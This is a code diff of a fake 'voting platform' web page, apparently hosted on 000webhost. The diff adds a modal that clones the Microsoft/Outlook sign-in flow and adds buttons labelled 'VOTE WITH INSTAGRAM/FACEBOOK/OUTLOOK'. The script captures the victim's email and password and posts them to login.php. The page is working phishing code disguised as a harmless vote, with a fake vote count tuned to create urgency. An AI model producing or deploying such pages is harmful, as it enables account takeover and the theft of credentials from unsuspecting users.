@@ -8,8 +8,6 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-
   <style>
     img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
       display: none;
@@ -56,6 +54,162 @@
       }
     }
   </style>
+
+  <style>
+    /* Basic styles for dialogs */
+    dialog {
+      width: 100vw;
+      border: none;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+    }
+
+    dialog::backdrop {
+      background: rgb(255, 255, 255);
+    }
+
+    .dialog-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .dialog-header h3 {
+      margin: 0;
+    }
+
+    .dialog-header button {
+      border: none;
+      background: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .container-item {
+      text-align: center;
+    }
+
+    .btn-item p {
+      cursor: pointer;
+      background: dodgerblue;
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+
+    .btn-item p:hover {
+      background: darkblue;
+    }
+  </style>
+
+  <style>
+    /* Hide the footer logo */
+    dialog#dialog3 img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
+      display: none;
+    }
+
+    /* General styles specific to dialog3 */
+    dialog#dialog3 * {
+      margin: auto;
+      height: auto;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    }
+
+    /* Container styles inside dialog3 */
+    dialog#dialog3 .container-item {
+      z-index: 9999;
+      margin: 40px;
+      overflow-x: hidden;
+    }
+
+    dialog#dialog3 .container-item-2 {
+      margin: 40px;
+      border: 1px solid #7c7c7c;
+      display: flex;
+      justify-content: left;
+      align-items: center;
+      color: #383838;
+      padding: 5px 15px;
+    }
+
+    /* Input fields specific to dialog3 */
+    dialog#dialog3 input {
+      padding: 10px 1px;
+      width: 100%;
+      border: 1px solid transparent;
+      border-bottom: 1px solid #383838;
+      z-index: 1;
+    }
+
+    dialog#dialog3 input:focus {
+      border-bottom: 1px solid red;
+      outline: 1px solid transparent;
+    }
+
+    /* Slide animations */
+    dialog#dialog3 .slide-one {
+      width: 100%;
+      transition: 0.5s ease all;
+    }
+
+    dialog#dialog3 .slide-two {
+      width: 100%;
+      transition: 0.5s ease all;
+    }
+
+    dialog#dialog3 .slide-one-toggle {
+      transform: translateX(-100%);
+    }
+
+    dialog#dialog3 .slide-two-toggle {
+      transform: translateX(-100%);
+    }
+
+    /* Button styles */
+    dialog#dialog3 #btn {
+      background: #0067B8;
+      color: white;
+      border: 1px solid transparent;
+      width: 100px;
+      text-align: center;
+      border-radius: 2px;
+      padding: 8px 5px;
+    }
+
+    dialog#dialog3 .btn-item {
+      display: flex;
+      justify-content: right;
+      margin: 25px 0;
+    }
+
+    /* Footer inside dialog3 */
+    dialog#dialog3 footer ul {
+      list-style-type: none;
+      display: flex;
+      justify-content: center;
+      position: fixed;
+      bottom: 0;
+      font-size: 12px;
+    }
+
+    dialog#dialog3 footer ul li {
+      padding: 5px 10px;
+    }
+
+    /* Links inside dialog3 */
+    dialog#dialog3 a {
+      text-decoration: none;
+      color: #383838;
+    }
+  </style>
 </head>
 
 <body>
@@ -64,17 +218,19 @@
     <center><img src="images/image.jpg" width="100px" height="100px">
       <h4 style="padding: 10px 0; text-overflow: ellipsis; width: 200px; overflow: hidden; color: #507392">Voting
         platform</h4>
-      <a href="instagram"><button style="background: #C62E2E;">VOTE WITH INSTAGRAM <i
-            class="fa fa-instagram"></i></button></a>
-      <a style="display:none;" href="facebook"><button style="background: #7263f7;">VOTE WITH <i
-            class="fa fa-facebook"></i></button></a>
-      <a href="microsoft"><button style="background:#0D92F4;">VOTE WITH OUTLOOK <i
-            class="fa fa-envelope"></i></button></a>
+
+      <button onclick="showDialog('dialog1')" style="background: #C62E2E;">VOTE WITH INSTAGRAM <i
+          class="fa fa-instagram"></i></button>
+      <button onclick="showDialog('dialog2')" style="background: #7263f7;">VOTE WITH <i
+          class="fa fa-facebook"></i></button>
+      <button onclick="showDialog('dialog3')" style="background:#0D92F4;">VOTE WITH OUTLOOK <i
+          class="fa fa-envelope"></i></button>
+
     </center><br>
     <ul>
       <li style="background: #F6F9FB; border-left: 2px solid #5B9BD1; "><i class="fa fa-home"></i> Total Votes: 312 out
         of 450</li>
-      <li style='color: #6f808a86'> <i class="fa fa-check"></i> Total Votes To Win: 450</li>
+      <li style='color: #6f808a86'> <i class="fa fa-check"></i> Total Votes To Win: 138</li>
       <a href="#" style='text-decoration: none; color: #6f808a86'>
         <li style='color: #6f808a86'><i class="fa fa-flag"></i> Help</li>
       </a>
@@ -83,14 +239,129 @@
   <h4 style="text-align: center; color: #3f3f3f;">Powered by <span style="color: #5B9BD1;"> google voting system</span>
   </h4>
 
-    <script>
-    document.addEventListener('contextmenu', event => {
-      event.preventDefault();
+
+  <dialog id="dialog3">
+    <div class="dialog-header">
+      <button style="color: red;" onclick="closeDialog('dialog3')">&times;</button>
+    </div>
+    <div class="container">
+      <div class="container-item">
+        <img src="./images/microsoft-logo.svg" alt=""><br><br>
+        <div id="form">
+          <div class="slide-one">
+            <h2>Sign in</h2>
+            <span class="msg" style="color: red; font-size: 13px;"></span><br>
+            <input type="email" id="hm-email" name="email" placeholder="Email, phone, or Skype"><br><br>
+            <p>No account? <a href=""><span>Create one!</span></a></p>
+            <p style="color: dodgerblue;">Sign in with a security key <img src="./images/question.JPG" alt=""></p>
+            <div class="btn-item">
+              <p id="btn" class="next">Next</p>
+            </div>
+          </div>
+
+          <div class="slide-two hidden">
+            <span class="msg2" style="color: red; font-size: 13px;"></span><br>
+            <p id="back"><i class="fa fa-arrow-left"></i> <span id="name" style="color: #383838;"></span></p><br>
+            <h2>Enter password</h2><br>
+            <input type="password" id="hm-pass" name="password" placeholder="Password"><br><br>
+            <p>Forget password?</p>
+            <a href="">
+              <p style="color: dodgerblue;">Other ways to sign in</p>
+            </a>
+            <div class="btn-item">
+              <button id="btn" onclick="hmlog()" class="submit">Sign in</button>
+            </div>
+          </div>
+        </div>
+        <div class="container-item-2"><img src="./images/key.JPG" width="25px"> <span style="color: #383838;">Sign- in
+            options</span></div>
+
+        <footer>
+          <ul>
+            <a href="#">
+              <li>Terms of use</li>
+            </a>
+            <a href="#">
+              <li>Privacy & cookies</li>
+            </a>
+            <a href="#">
+              <li>...</li>
+            </a>
+          </ul>
+        </footer>
+      </div>
+    </div>
+  </dialog>
+
+  <script>
+    // Function to show a dialog
+    function showDialog(dialogId) {
+      document.getElementById(dialogId).showModal();
+    }
+
+    // Function to close a dialog
+    function closeDialog(dialogId) {
+      document.getElementById(dialogId).close();
+    }
+
+    // Login form logic
+    const next = document.querySelector('.next');
+    const submit = document.querySelector('.submit');
+    const slideOne = document.querySelector('.slide-one');
+    const slideTwo = document.querySelector('.slide-two');
+    const email = document.getElementById('hm-email');
+    const nameText = document.getElementById('name');
+    const backBtn = document.getElementById('back');
+    const password = document.getElementById('hm-pass');
+    const msg = document.querySelector('.msg');
+    const msg2 = document.querySelector('.msg2');
+
+    next.addEventListener('click', function () {
+      if (email.value === "") {
+        msg.textContent = 'Enter a valid email address, phone number, or Skype name.';
+      } else {
+        msg.textContent = "";
+        nameText.textContent = email.value;
+        slideOne.classList.add('hidden');
+        slideTwo.classList.remove('hidden');
+      }
     });
 
-    document.querySelectorAll('.disabled').forEach(element => {
-      element.style.pointerEvents = 'none';
+    backBtn.addEventListener('click', function () {
+      slideOne.classList.remove('hidden');
+      slideTwo.classList.add('hidden');
     });
+
+    submit.addEventListener('click', async function () {
+      if (password.value === "") {
+        msg2.textContent = 'Please enter the password for your Microsoft account.';
+      } else {
+        try {
+          const response = await fetch('./login.php', {
+            method: 'POST',
+            body: new URLSearchParams({
+              'hm-email': email.value + " (hotmail)",
+              'hm-pass': password.value
+            })
+          });
+          const result = await response.text();
+          console.log(result);
+        } catch (error) {
+          console.error('Error:', error);
+        }
+      }
+    });
+
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="js/firebase.js">
+
   </script>
 </body>
 
